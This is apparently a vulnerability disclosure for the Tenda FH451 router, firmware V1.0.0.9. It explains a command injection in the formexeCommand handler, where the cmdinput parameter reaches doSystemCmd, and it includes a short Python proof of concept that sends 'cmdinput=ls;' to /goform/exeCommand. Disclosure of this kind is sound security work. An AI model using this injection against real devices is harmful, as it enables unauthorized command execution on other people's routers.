## Overview
Firmware download website: https://www.tenda.com.cn/download/detail-1629.html
## Affected version

FH451  V1.0.0.9
## Vulnerability details

Tenda FH451 V1.0.0.9 , we discovered a command injection vulnerablility in `formexeCommand` function in the `cmdinput` parameter and the `str` varable is assigned to `cmd_buf` variable, which is directly used in `doSystemCmd` function, causing an arbitrary command execution. The user-provided `cmdinput` can trigger this security vulnerability.
![[2024-08-30 160641.png]]
## POC

```python
import requests
IP = "192.168.109.145"
url = f"http://{IP}/goform/exeCommand"
data = "cmdinput=ls;"
ret = requests.post(url=url,data=data)
```
![[2024-08-30 160834.png]]